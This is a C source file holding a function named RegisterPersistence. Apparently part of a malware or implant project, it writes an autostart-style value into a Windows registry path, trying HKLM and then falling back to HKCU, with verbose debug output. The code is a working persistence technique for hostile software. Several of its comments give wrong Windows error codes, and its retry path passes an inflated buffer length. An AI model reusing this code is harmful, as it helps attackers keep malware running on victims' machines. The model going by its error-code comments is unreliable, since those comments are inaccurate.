#include "../include/config.h"

BOOL RegisterPersistence(void) {
    HKEY hKey;
    LONG ret;

    printf("[DEBUG] RegisterPersistence: Trying HKLM...\n");
    fflush(stdout);

    // Debug: Print the actual path being used
    printf("[DEBUG] Attempting to open: %ls\n", PERSIST_PATH);
    fflush(stdout);

    // Try HKLM first, fallback to HKCU
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKLM opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        // Debug: Calculate the exact size for wide string
        wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
        size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
        
        printf("[DEBUG] Value name: %ls\n", PERSIST_VAL_NAME);
        printf("[DEBUG] Value data: %ls\n", testData);
        printf("[DEBUG] Calculated length: %lu bytes\n", (unsigned long)dataLen);
        fflush(stdout);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)testData, (DWORD)dataLen);
        
        printf("[DEBUG] HKLM RegSetValueExW result: %lu\n", ret);
        fflush(stdout);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKLM SetValue failed: %lu\n", ret);
            DWORD err = GetLastError();
            printf("[DEBUG] Last Error: %lu\n", err);
            fflush(stdout);
            
            // Common errors:
            // 0x8000000A (ERROR_MORE_DATA) - Buffer too small
            // 0x8007000A (ERROR_BUFFER_OVERFLOW) - Same thing
            // 0xC0000028 (ERROR_SUCCESS but already exists)
            if (ret == 0x8000000A || ret == 0x8007000A) {
                printf("[DEBUG] Buffer size error - retrying with larger buffer...\n");
                // Retry with larger buffer
                size_t dataLen2 = ((wcslen(testData) + 1) * sizeof(wchar_t)) + 1000;
                ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                                    (LPBYTE)testData, (DWORD)dataLen2);
                printf("[DEBUG] Retry result: %lu\n", ret);
            }
        }
        
        RegCloseKey(hKey);
    }
    else {
        printf("[DEBUG] HKLM opened failed: %lu\n", ret);
        DWORD err = GetLastError();
        printf("[DEBUG] HKLM Last Error: %lu\n", err);
        
        // Error 298 = ERROR_MORE_DATA (usually means buffer size issue)
        // Error 5 = ACCESS_DENIED (might need to use HKCU)
        // Error 501 = ERROR_ACCESS_DENIED
        if (err == 5 || err == 501) {
            printf("[DEBUG] HKLM Access Denied, trying HKCU...\n");
            fflush(stdout);
        }
        fflush(stdout);
    }

    // Fallback to HKCU if HKLM fails
    printf("[DEBUG] Trying HKCU...\n");
    fflush(stdout);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        // Calculate the correct size for wide string
        wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
        size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)testData, (DWORD)dataLen);
        
        printf("[DEBUG] HKCU RegSetValueExW result: %lu\n", ret);
        fflush(stdout);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKCU)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKCU SetValue failed: %lu (Error: %lu)\n", ret, (unsigned long)GetLastError());
            fflush(stdout);
        }
        
        RegCloseKey(hKey);
    }
    else {
        printf("[DEBUG] HKCU opened failed: %lu (Error: %lu)\n", ret, (unsigned long)GetLastError());
        fflush(stdout);
    }

    printf("[DEBUG] No registry key created\n");
    fflush(stdout);
    return FALSE;
}